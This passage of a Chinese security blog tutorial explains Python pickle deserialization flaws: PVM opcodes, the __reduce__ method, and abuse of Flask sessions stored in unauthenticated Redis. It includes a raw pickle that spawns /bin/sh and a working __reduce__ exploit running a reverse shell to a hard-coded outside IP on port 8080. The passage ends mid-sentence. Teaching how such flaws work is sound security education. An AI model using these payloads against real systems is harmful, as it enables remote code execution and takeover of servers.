+<h5 id="说到序列化就要到PVM虚拟机这里就不作介绍了，下面给出一个比较重要的："><a href="#说到序列化就要到PVM虚拟机这里就不作介绍了，下面给出一个比较重要的：" class="headerlink" title="说到序列化就要到PVM虚拟机这里就不作介绍了，下面给出一个比较重要的："></a>说到序列化就要到PVM虚拟机这里就不作介绍了，下面给出一个比较重要的：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">S : 后面跟的是字符串</span><br><span class="line">( ：作为命令执行到哪里的一个标记</span><br><span class="line">t ：将从 t 到标记的全部元素组合成一个元祖，然后放入栈中</span><br><span class="line">c ：定义模块名和类名（模块名和类名之间使用回车分隔）</span><br><span class="line">R ：从栈中取出可调用函数以及元祖形式的参数来执行，并把结果放回栈中</span><br><span class="line">. ：点号是结束符</span><br></pre></td></tr></table></figure>
+
+<h5 id="反序列化流程"><a href="#反序列化流程" class="headerlink" title="反序列化流程"></a>反序列化流程</h5><h6 id="序列化就是一个将对象转化成字符串的过程，这个我们能直接使用-pickle-实现，这个过程我们也无需利用和分析，这里不做深究，我这里就是说一下如何进行的反序列化"><a href="#序列化就是一个将对象转化成字符串的过程，这个我们能直接使用-pickle-实现，这个过程我们也无需利用和分析，这里不做深究，我这里就是说一下如何进行的反序列化" class="headerlink" title="序列化就是一个将对象转化成字符串的过程，这个我们能直接使用 pickle 实现，这个过程我们也无需利用和分析，这里不做深究，我这里就是说一下如何进行的反序列化"></a>序列化就是一个将对象转化成字符串的过程，这个我们能直接使用 pickle 实现，这个过程我们也无需利用和分析，这里不做深究，我这里就是说一下如何进行的反序列化</h6><h6 id="我们将下面这个字符串存储为一个文件-shell-pickle"><a href="#我们将下面这个字符串存储为一个文件-shell-pickle" class="headerlink" title="我们将下面这个字符串存储为一个文件 shell.pickle"></a>我们将下面这个字符串存储为一个文件 shell.pickle</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">   cos</span><br><span class="line">system</span><br><span class="line">(S&apos;/bin/sh&apos;</span><br><span class="line">tR.</span><br></pre></td></tr></table></figure>
+
+<h6 id="当我们使用下面这个函数对其进行加载的时候"><a href="#当我们使用下面这个函数对其进行加载的时候" class="headerlink" title="当我们使用下面这个函数对其进行加载的时候"></a>当我们使用下面这个函数对其进行加载的时候</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import pickle</span><br><span class="line">&gt;&gt;&gt; pickle.load(open(&apos;shell.pickle&apos;))</span><br></pre></td></tr></table></figure>
+
+<h6 id="执行结果如下："><a href="#执行结果如下：" class="headerlink" title="执行结果如下："></a>执行结果如下：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import pickle</span><br><span class="line">&gt;&gt;&gt; pickle.load(open(&apos;shell.pickle&apos;))</span><br><span class="line">#</span><br><span class="line">#</span><br></pre></td></tr></table></figure>
+
+<h5 id="可以看到成功返回了-sh-的-shell"><a href="#可以看到成功返回了-sh-的-shell" class="headerlink" title="可以看到成功返回了 sh 的 shell"></a>可以看到成功返回了 sh 的 shell</h5><h6 id="我们现在来结合我们上面讲述的-PVM-的操作码看这个文件中的字符串是怎么一步一步执行的"><a href="#我们现在来结合我们上面讲述的-PVM-的操作码看这个文件中的字符串是怎么一步一步执行的" class="headerlink" title="我们现在来结合我们上面讲述的 PVM 的操作码看这个文件中的字符串是怎么一步一步执行的"></a>我们现在来结合我们上面讲述的 PVM 的操作码看这个文件中的字符串是怎么一步一步执行的</h6><h6 id="1-c-后面是模块名，换行后是类名-于是将-os-system-放入栈中"><a href="#1-c-后面是模块名，换行后是类名-于是将-os-system-放入栈中" class="headerlink" title="(1)c 后面是模块名，换行后是类名,于是将 os.system 放入栈中"></a>(1)c 后面是模块名，换行后是类名,于是将 os.system 放入栈中</h6><h6 id="2-这个是标记符，我们将一个-Mark-放入栈中"><a href="#2-这个是标记符，我们将一个-Mark-放入栈中" class="headerlink" title="(2)( 这个是标记符，我们将一个 Mark 放入栈中"></a>(2)( 这个是标记符，我们将一个 Mark 放入栈中</h6><h6 id="3-S-后面是字符串，我们放入栈中"><a href="#3-S-后面是字符串，我们放入栈中" class="headerlink" title="(3)S 后面是字符串，我们放入栈中"></a>(3)S 后面是字符串，我们放入栈中</h6><h6 id="4-t-将栈中-Mark-之前的内容取出来转化成元祖，再存入栈中-（’-bin-sh’-），同时标记-Mark-消失"><a href="#4-t-将栈中-Mark-之前的内容取出来转化成元祖，再存入栈中-（’-bin-sh’-），同时标记-Mark-消失" class="headerlink" title="(4)t 将栈中 Mark 之前的内容取出来转化成元祖，再存入栈中 （’/bin/sh’,），同时标记 Mark 消失"></a>(4)t 将栈中 Mark 之前的内容取出来转化成元祖，再存入栈中 （’/bin/sh’,），同时标记 Mark 消失</h6><h6 id="5-R-将元祖取出，并将-callable-取出，然后将元祖作为-callable-的参数，并执行，对应这里就是-os-system-‘-bin-sh’-然后将结果再存入栈中"><a href="#5-R-将元祖取出，并将-callable-取出，然后将元祖作为-callable-的参数，并执行，对应这里就是-os-system-‘-bin-sh’-然后将结果再存入栈中" class="headerlink" title="(5)R 将元祖取出，并将 callable 取出，然后将元祖作为 callable 的参数，并执行，对应这里就是 os.system(‘/bin/sh’),然后将结果再存入栈中"></a>(5)R 将元祖取出，并将 callable 取出，然后将元祖作为 callable 的参数，并执行，对应这里就是 os.system(‘/bin/sh’),然后将结果再存入栈中</h6><h5 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">其实并不是所有的对象都能使用 pickle 进行序列化和反序列化，比如说 文件对象和网络套接字对象以及代码对象就不可以</span><br></pre></td></tr></table></figure>
+
+<h4 id="0x06-与PHP反序列化的对比"><a href="#0x06-与PHP反序列化的对比" class="headerlink" title="0x06 与PHP反序列化的对比"></a>0x06 与PHP反序列化的对比</h4><h5 id="相比于-PHP-反序列化必须要依赖于当前代码中类的存在以及方法的存在，Python-凭借着自己彻底的面向对象的特性完胜-PHP-，Python-除了能反序列化当前代码中出现的类-包括通过-import的方式引入的模块中的类-的对象以外，还能利用其彻底的面向对象的特性来反序列化使用-types-创建的匿名对象（这部分内容在后面会有所介绍），这样的话就大大拓宽了我们的攻击面。"><a href="#相比于-PHP-反序列化必须要依赖于当前代码中类的存在以及方法的存在，Python-凭借着自己彻底的面向对象的特性完胜-PHP-，Python-除了能反序列化当前代码中出现的类-包括通过-import的方式引入的模块中的类-的对象以外，还能利用其彻底的面向对象的特性来反序列化使用-types-创建的匿名对象（这部分内容在后面会有所介绍），这样的话就大大拓宽了我们的攻击面。" class="headerlink" title="相比于 PHP 反序列化必须要依赖于当前代码中类的存在以及方法的存在，Python 凭借着自己彻底的面向对象的特性完胜 PHP ，Python 除了能反序列化当前代码中出现的类(包括通过 import的方式引入的模块中的类)的对象以外，还能利用其彻底的面向对象的特性来反序列化使用 types 创建的匿名对象（这部分内容在后面会有所介绍），这样的话就大大拓宽了我们的攻击面。"></a>相比于 PHP 反序列化必须要依赖于当前代码中类的存在以及方法的存在，Python 凭借着自己彻底的面向对象的特性完胜 PHP ，Python 除了能反序列化当前代码中出现的类(包括通过 import的方式引入的模块中的类)的对象以外，还能利用其彻底的面向对象的特性来反序列化使用 types 创建的匿名对象（这部分内容在后面会有所介绍），这样的话就大大拓宽了我们的攻击面。</h5><h4 id="0x07-Python-反序列化漏洞的由来"><a href="#0x07-Python-反序列化漏洞的由来" class="headerlink" title="0x07 Python 反序列化漏洞的由来"></a>0x07 Python 反序列化漏洞的由来</h4><h5 id="1-为什么会出现反序列化漏洞"><a href="#1-为什么会出现反序列化漏洞" class="headerlink" title="1.为什么会出现反序列化漏洞"></a>1.为什么会出现反序列化漏洞</h5><h6 id="下面是python官方文档的介绍。"><a href="#下面是python官方文档的介绍。" class="headerlink" title="下面是python官方文档的介绍。"></a>下面是python<a href="https://docs.python.org/2/library/pickle.html" target="_blank" rel="noopener">官方文档</a>的介绍。</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Warning The pickle module is not secure against erroneous or maliciously constructed data. </span><br><span class="line">Never unpickle data received from an untrusted or unauthenticated source.</span><br></pre></td></tr></table></figure>
+
+<h5 id="说的意思就是官方并不没有义务保证你传入反序列化函数的内容是安全的，官方只负责反序列化，如果你传入不安全的内容那么自然就是不安全的"><a href="#说的意思就是官方并不没有义务保证你传入反序列化函数的内容是安全的，官方只负责反序列化，如果你传入不安全的内容那么自然就是不安全的" class="headerlink" title="说的意思就是官方并不没有义务保证你传入反序列化函数的内容是安全的，官方只负责反序列化，如果你传入不安全的内容那么自然就是不安全的"></a>说的意思就是官方并不没有义务保证你传入反序列化函数的内容是安全的，官方只负责反序列化，如果你传入不安全的内容那么自然就是不安全的</h5><h4 id="2-反序列化漏洞往往出现在什么地方"><a href="#2-反序列化漏洞往往出现在什么地方" class="headerlink" title="2.反序列化漏洞往往出现在什么地方"></a>2.反序列化漏洞往往出现在什么地方</h4><h5 id="这里引用勾陈安全实验室的大佬写的"><a href="#这里引用勾陈安全实验室的大佬写的" class="headerlink" title="这里引用勾陈安全实验室的大佬写的"></a>这里引用勾陈安全实验室的大佬<a href="http://www.polaris-lab.com/index.php/archives/178/" target="_blank" rel="noopener">写的</a></h5><h5 id="1-通常在解析认证token，session的时候"><a href="#1-通常在解析认证token，session的时候" class="headerlink" title="1.通常在解析认证token，session的时候"></a>1.通常在解析认证token，session的时候</h5><h6 id="现在很多web都使用redis、mongodb、memcached等来存储session等状态信息。P神的文章就有一个很好的redis-python反序列化漏洞的很好例子：https-www-leavesongs-com-PENETRATION-zhangyue-python-web-code-execute-html。"><a href="#现在很多web都使用redis、mongodb、memcached等来存储session等状态信息。P神的文章就有一个很好的redis-python反序列化漏洞的很好例子：https-www-leavesongs-com-PENETRATION-zhangyue-python-web-code-execute-html。" class="headerlink" title="现在很多web都使用redis、mongodb、memcached等来存储session等状态信息。P神的文章就有一个很好的redis+python反序列化漏洞的很好例子：https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html。"></a>现在很多web都使用redis、mongodb、memcached等来存储session等状态信息。P神的文章就有一个很好的redis+python反序列化漏洞的很好例子：<a href="https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html</a>。</h6><h5 id="2-可能将对象Pickle后存储成磁盘文件。"><a href="#2-可能将对象Pickle后存储成磁盘文件。" class="headerlink" title="2.可能将对象Pickle后存储成磁盘文件。"></a>2.可能将对象Pickle后存储成磁盘文件。</h5><h5 id="3-可能将对象Pickle后在网络中传输。"><a href="#3-可能将对象Pickle后在网络中传输。" class="headerlink" title="3.可能将对象Pickle后在网络中传输。"></a>3.可能将对象Pickle后在网络中传输。</h5><h5 id="其实，最常见的也是最经典的也就是我们的第一点，也就是-flask-配合-redis-在服务端存储-session-的情景，这里的-session-是被-pickle-序列化进行存储的，如果你通过-cookie-进行请求-sessionid-的话，session-中的内容就会被反序列化，看似好像是没有什么问题-因为-session-是存储在-服务端的，但是终究是抵不住-redis-的未授权访问，如果出现未授权的话，我们就能通过-set-设置自己的-session-然后通过设置-cookie-去请求-session-的过程中我们自定的内容就会被反序列化，然后我们就达到了执行任意命令或者任意代码的目的"><a href="#其实，最常见的也是最经典的也就是我们的第一点，也就是-flask-配合-redis-在服务端存储-session-的情景，这里的-session-是被-pickle-序列化进行存储的，如果你通过-cookie-进行请求-sessionid-的话，session-中的内容就会被反序列化，看似好像是没有什么问题-因为-session-是存储在-服务端的，但是终究是抵不住-redis-的未授权访问，如果出现未授权的话，我们就能通过-set-设置自己的-session-然后通过设置-cookie-去请求-session-的过程中我们自定的内容就会被反序列化，然后我们就达到了执行任意命令或者任意代码的目的" class="headerlink" title="其实，最常见的也是最经典的也就是我们的第一点，也就是 flask 配合 redis 在服务端存储 session 的情景，这里的 session 是被 pickle 序列化进行存储的，如果你通过 cookie 进行请求 sessionid 的话，session 中的内容就会被反序列化，看似好像是没有什么问题,因为 session 是存储在 服务端的，但是终究是抵不住 redis 的未授权访问，如果出现未授权的话，我们就能通过 set 设置自己的 session ,然后通过设置 cookie 去请求 session 的过程中我们自定的内容就会被反序列化，然后我们就达到了执行任意命令或者任意代码的目的"></a>其实，最常见的也是最经典的也就是我们的第一点，也就是 flask 配合 redis 在服务端存储 session 的情景，这里的 session 是被 pickle 序列化进行存储的，如果你通过 cookie 进行请求 sessionid 的话，session 中的内容就会被反序列化，看似好像是没有什么问题,因为 session 是存储在 服务端的，但是终究是抵不住 redis 的未授权访问，如果出现未授权的话，我们就能通过 set 设置自己的 session ,然后通过设置 cookie 去请求 session 的过程中我们自定的内容就会被反序列化，然后我们就达到了执行任意命令或者任意代码的目的</h5><h4 id="3-我们怎么利用反序列化漏洞"><a href="#3-我们怎么利用反序列化漏洞" class="headerlink" title="3.我们怎么利用反序列化漏洞"></a>3.我们怎么利用反序列化漏洞</h4><h5 id="利用的关键点还是如何构造我们的反序列化的-payload，这时候就不得不提到-reduce-这个魔法方法了（注意：-reduce-方法是新式类-内置类-特有的-）"><a href="#利用的关键点还是如何构造我们的反序列化的-payload，这时候就不得不提到-reduce-这个魔法方法了（注意：-reduce-方法是新式类-内置类-特有的-）" class="headerlink" title="利用的关键点还是如何构造我们的反序列化的 payload，这时候就不得不提到 reduce 这个魔法方法了（注意：__reduce__方法是新式类(内置类)特有的,）"></a>利用的关键点还是如何构造我们的反序列化的 payload，这时候就不得不提到 <strong>reduce</strong> 这个魔法方法了（注意：__reduce__方法是新式类(内置类)特有的,）</h5><h5 id="关于新式类-内置类-和旧式类-自建类-，我这里简单的说一下，如果想看具体的，请转向-bendawang-师傅的这篇博客"><a href="#关于新式类-内置类-和旧式类-自建类-，我这里简单的说一下，如果想看具体的，请转向-bendawang-师傅的这篇博客" class="headerlink" title="关于新式类(内置类)和旧式类(自建类)，我这里简单的说一下，如果想看具体的，请转向 bendawang 师傅的这篇博客"></a>关于新式类(内置类)和旧式类(自建类)，我这里简单的说一下，如果想看具体的，请转向 bendawang 师傅的这篇<a href="http://www.bendawang.site/2017/03/21/python%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0-%E4%B8%80-%EF%BC%9A%E7%B1%BB%E4%B8%8E%E5%85%83%E7%B1%BB%EF%BC%88metaclass%EF%BC%89%E7%9A%84%E7%90%86%E8%A7%A3/" target="_blank" rel="noopener">博客</a></h5><h5 id="在-python2-中有两种声明类的方式，并且他们实例化的对象性质是不同的"><a href="#在-python2-中有两种声明类的方式，并且他们实例化的对象性质是不同的" class="headerlink" title="在 python2 中有两种声明类的方式，并且他们实例化的对象性质是不同的"></a>在 python2 中有两种声明类的方式，并且他们实例化的对象性质是不同的</h5><h4 id="示例代码："><a href="#示例代码：" class="headerlink" title="示例代码："></a>示例代码：</h4><h5 id="旧式代码："><a href="#旧式代码：" class="headerlink" title="旧式代码："></a>旧式代码：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; class A():</span><br><span class="line">...     pass</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; a=A()</span><br><span class="line">&gt;&gt;&gt; type(a)</span><br><span class="line">&lt;type &apos;instance&apos;&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="新式代码："><a href="#新式代码：" class="headerlink" title="新式代码："></a>新式代码：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; class B(object):</span><br><span class="line">...       pass</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; b=B()</span><br><span class="line">&gt;&gt;&gt; type(b)</span><br><span class="line">&lt;class &apos;__main__.B&apos;&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="但是-Python3-中解决了这个问题，在表现上消除了两者的差别，所以如果在-python2-中我们使用-reduce-要使用下面这种声明类的方法"><a href="#但是-Python3-中解决了这个问题，在表现上消除了两者的差别，所以如果在-python2-中我们使用-reduce-要使用下面这种声明类的方法" class="headerlink" title="但是 Python3 中解决了这个问题，在表现上消除了两者的差别，所以如果在 python2 中我们使用 __reduce__ 要使用下面这种声明类的方法"></a>但是 Python3 中解决了这个问题，在表现上消除了两者的差别，所以如果在 python2 中我们使用 __reduce__ 要使用下面这种声明类的方法</h5><h5 id="好了，回到正题，我们先看一下官方是怎么介绍这个-reduce-的，"><a href="#好了，回到正题，我们先看一下官方是怎么介绍这个-reduce-的，" class="headerlink" title="好了，回到正题，我们先看一下官方是怎么介绍这个 __reduce__ 的，"></a>好了，回到正题，我们先看一下官方是怎么介绍这个 __reduce__ 的，</h5><h5 id="当序列化以及反序列化的过程中中碰到一无所知的扩展类型-这里指的就是新式类-的时候，可以通过类中定义的-reduce-方法来告知如何进行序列化或者反序列化"><a href="#当序列化以及反序列化的过程中中碰到一无所知的扩展类型-这里指的就是新式类-的时候，可以通过类中定义的-reduce-方法来告知如何进行序列化或者反序列化" class="headerlink" title="当序列化以及反序列化的过程中中碰到一无所知的扩展类型(这里指的就是新式类)的时候，可以通过类中定义的__reduce__方法来告知如何进行序列化或者反序列化"></a>当序列化以及反序列化的过程中中碰到一无所知的扩展类型(这里指的就是新式类)的时候，可以通过类中定义的__reduce__方法来告知如何进行序列化或者反序列化</h5><h5 id="也就是说我们，只要在新式类中定义一个-reduce-方法，我们就能在序列化的使用让这个类根据我们在-reduce-中指定的方式进行序列化，那这就非常好，那我们该如何指定呢？实际上关键就在这个方法的返回值上，这个方法可以返回两种类型的值，String-和-tuple-我们的构造点就在令其返回-tuple-的时候"><a href="#也就是说我们，只要在新式类中定义一个-reduce-方法，我们就能在序列化的使用让这个类根据我们在-reduce-中指定的方式进行序列化，那这就非常好，那我们该如何指定呢？实际上关键就在这个方法的返回值上，这个方法可以返回两种类型的值，String-和-tuple-我们的构造点就在令其返回-tuple-的时候" class="headerlink" title="也就是说我们，只要在新式类中定义一个 __reduce__ 方法，我们就能在序列化的使用让这个类根据我们在__reduce__ 中指定的方式进行序列化，那这就非常好，那我们该如何指定呢？实际上关键就在这个方法的返回值上，这个方法可以返回两种类型的值，String 和 tuple ,我们的构造点就在令其返回 tuple 的时候"></a>也就是说我们，只要在新式类中定义一个 __reduce__ 方法，我们就能在序列化的使用让这个类根据我们在__reduce__ 中指定的方式进行序列化，那这就非常好，那我们该如何指定呢？实际上关键就在这个方法的返回值上，这个方法可以返回两种类型的值，String 和 tuple ,我们的构造点就在令其返回 tuple 的时候</h5><h5 id="当他返回值是一个元祖的时候，可以提供2到5个参数，我们重点利用的是前两个，第一个参数是一个callable-object-可调用的对象-，第二个参数可以是一个元祖为这个可调用对象提供必要的参数，如果你认真看上面的-PVM-的指令码，你就会发现这个返回值和其中的一个-R-指令非常的一致，（我猜测这个-R-指令码就是这个-reduce-方法的返回值的底层实现-）"><a href="#当他返回值是一个元祖的时候，可以提供2到5个参数，我们重点利用的是前两个，第一个参数是一个callable-object-可调用的对象-，第二个参数可以是一个元祖为这个可调用对象提供必要的参数，如果你认真看上面的-PVM-的指令码，你就会发现这个返回值和其中的一个-R-指令非常的一致，（我猜测这个-R-指令码就是这个-reduce-方法的返回值的底层实现-）" class="headerlink" title="当他返回值是一个元祖的时候，可以提供2到5个参数，我们重点利用的是前两个，第一个参数是一个callable object(可调用的对象)，第二个参数可以是一个元祖为这个可调用对象提供必要的参数，如果你认真看上面的 PVM 的指令码，你就会发现这个返回值和其中的一个 R 指令非常的一致，（我猜测这个 R 指令码就是这个 __reduce__ 方法的返回值的底层实现 ）"></a>当他返回值是一个元祖的时候，可以提供2到5个参数，我们重点利用的是前两个，第一个参数是一个callable object(可调用的对象)，第二个参数可以是一个元祖为这个可调用对象提供必要的参数，如果你认真看上面的 PVM 的指令码，你就会发现这个返回值和其中的一个 R 指令非常的一致，（我猜测这个 R 指令码就是这个 __reduce__ 方法的返回值的底层实现 ）</h5><h4 id="开始实践："><a href="#开始实践：" class="headerlink" title="开始实践："></a>开始实践：</h4><h5 id="示例代码：-1"><a href="#示例代码：-1" class="headerlink" title="示例代码："></a>示例代码：</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        a = <span class="string">'/bin/sh'</span></span><br><span class="line">        <span class="keyword">return</span> (os.system,(a,))</span><br><span class="line"></span><br><span class="line">a = A()</span><br><span class="line">test = pickle.dumps(a)</span><br><span class="line"><span class="keyword">print</span> test</span><br></pre></td></tr></table></figure>
+
+<h5 id="运行的结果："><a href="#运行的结果：" class="headerlink" title="运行的结果："></a>运行的结果：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cposix</span><br><span class="line">system</span><br><span class="line">p0</span><br><span class="line">(S&apos;/bin/sh&apos;</span><br><span class="line">p1</span><br><span class="line">tp2</span><br><span class="line">Rp3</span><br><span class="line">.</span><br></pre></td></tr></table></figure>
+
+<h5 id="我们先不要管这里面的-p0-p1-p2-我上面说过了，这个东西是一个标签，有了它只是会出现一个存入内存的操作，p-后面的数字是-key-，因此对最后命令的执行没有任何影响"><a href="#我们先不要管这里面的-p0-p1-p2-我上面说过了，这个东西是一个标签，有了它只是会出现一个存入内存的操作，p-后面的数字是-key-，因此对最后命令的执行没有任何影响" class="headerlink" title="我们先不要管这里面的 p0 p1 p2 ,我上面说过了，这个东西是一个标签，有了它只是会出现一个存入内存的操作，p 后面的数字是 key ，因此对最后命令的执行没有任何影响"></a>我们先不要管这里面的 p0 p1 p2 ,我上面说过了，这个东西是一个标签，有了它只是会出现一个存入内存的操作，p 后面的数字是 key ，因此对最后命令的执行没有任何影响</h5><h5 id="为了比较方便，我再把上面的那段代码拿下来"><a href="#为了比较方便，我再把上面的那段代码拿下来" class="headerlink" title="为了比较方便，我再把上面的那段代码拿下来"></a>为了比较方便，我再把上面的那段代码拿下来</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cos</span><br><span class="line">system</span><br><span class="line">(S&apos;/bin/sh&apos;</span><br><span class="line">tR.</span><br></pre></td></tr></table></figure>
+
+<h5 id="PVM-的-操作码-R-就是-reduce-的返回值的一个底层实现。"><a href="#PVM-的-操作码-R-就是-reduce-的返回值的一个底层实现。" class="headerlink" title="PVM 的 操作码 R 就是 __reduce__ 的返回值的一个底层实现。"></a>PVM 的 操作码 R 就是 __reduce__ 的返回值的一个底层实现。</h5><h4 id="紧接着我们让上面的结果进行反序列化一下："><a href="#紧接着我们让上面的结果进行反序列化一下：" class="headerlink" title="紧接着我们让上面的结果进行反序列化一下："></a>紧接着我们让上面的结果进行反序列化一下：</h4><h5 id="示例代码：-2"><a href="#示例代码：-2" class="headerlink" title="示例代码："></a>示例代码：</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        a = <span class="string">'/bin/sh'</span></span><br><span class="line">        <span class="keyword">return</span> (os.system,(a,))</span><br><span class="line"></span><br><span class="line">a = A()</span><br><span class="line">test = pickle.dumps(a)</span><br><span class="line">pickle.loads(test)</span><br></pre></td></tr></table></figure>
+
+<h5 id="那这样就非常的方便了，我们能利用这个-reduce-轻松构造我们想要执行的命令，甚至是执行代码（我们可以将-字符串部分换成-python-c-“我们要执行的代码”）"><a href="#那这样就非常的方便了，我们能利用这个-reduce-轻松构造我们想要执行的命令，甚至是执行代码（我们可以将-字符串部分换成-python-c-“我们要执行的代码”）" class="headerlink" title="那这样就非常的方便了，我们能利用这个 reduce 轻松构造我们想要执行的命令，甚至是执行代码（我们可以将 字符串部分换成 python -c “我们要执行的代码”）"></a>那这样就非常的方便了，我们能利用这个 reduce 轻松构造我们想要执行的命令，甚至是执行代码（我们可以将 字符串部分换成 python -c “我们要执行的代码”）</h5><h4 id="我们尝试执行代码反弹-shell"><a href="#我们尝试执行代码反弹-shell" class="headerlink" title="我们尝试执行代码反弹 shell"></a>我们尝试执行代码反弹 shell</h4><h4 id="示例代码"><a href="#示例代码" class="headerlink" title="示例代码"></a>示例代码</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        a = <span class="string">"""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("123.57.232.69",8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""</span></span><br><span class="line">        <span class="keyword">return</span> (os.system,(a,))</span><br><span class="line">a=A()</span><br><span class="line">result = pickle.dumps(a)</span><br><span class="line">pickle.loads(result)</span><br></pre></td></tr></table></figure>
+
+<h4 id="我们成功运行我们的代码，成功反弹shell。"><a href="#我们成功运行我们的代码，成功反弹shell。" class="headerlink" title="我们成功运行我们的代码，成功反弹shell。"></a>我们成功运行我们的代码，成功反弹shell。</h4><h5 id="这里就不给出运行结果了。"><a href="#这里就不给出运行结果了。" class="headerlink" title="这里就不给出运行结果了。"></a>这里就不给出运行结果了。</h5><h4 id="补充："><a href="#补充：" class="headerlink" title="补充："></a>补充：</h4><h5 id="又发现了一个比较好的命令能执行-系统命令，那就是-python-pty-模块"><a href="#又发现了一个比较好的命令能执行-系统命令，那就是-python-pty-模块" class="headerlink" title="又发现了一个比较好的命令能执行 系统命令，那就是 python pty 模块"></a>又发现了一个比较好的命令能执行 系统命令，那就是 python pty 模块</h5><h4 id="3-问题出现"><a href="#3-问题出现" class="headerlink" title="3.问题出现"></a>3.问题出现</h4><h5 id="我们发现如果我们单纯地使用-c-参数执行代码的话，好像对一些简单的代码还行，但是如果出现了一些自定义函数了，那么在格式上就比较麻烦，那么有没有一种方式可以满足我们真正执行我们想执行的任何代码的目的呢？"><a href="#我们发现如果我们单纯地使用-c-参数执行代码的话，好像对一些简单的代码还行，但是如果出现了一些自定义函数了，那么在格式上就比较麻烦，那么有没有一种方式可以满足我们真正执行我们想执行的任何代码的目的呢？" class="headerlink" title="我们发现如果我们单纯地使用 -c 参数执行代码的话，好像对一些简单的代码还行，但是如果出现了一些自定义函数了，那么在格式上就比较麻烦，那么有没有一种方式可以满足我们真正执行我们想执行的任何代码的目的呢？"></a>我们发现如果我们单纯地使用 -c 参数执行代码的话，好像对一些简单的代码还行，但是如果出现了一些自定义函数了，那么在格式上就比较麻烦，那么有没有一种方式可以满足我们真正执行我们想执行的任何代码的目的呢？</h5><h5 id="咦？你上面不是说-pickle-不能序列化代码对象吗？-没错，pickle-的确不可以，不信我们试一试"><a href="#咦？你上面不是说-pickle-不能序列化代码对象吗？-没错，pickle-的确不可以，不信我们试一试" class="headerlink" title="咦？你上面不是说 pickle 不能序列化代码对象吗？ 没错，pickle 的确不可以，不信我们试一试"></a>咦？你上面不是说 pickle 不能序列化代码对象吗？ 没错，pickle 的确不可以，不信我们试一试</h5><h5 id="由于python可以在函数当中再导入模块和定义函数，所以我们可以将自己要执行的代码都写到一个函数里foo"><a 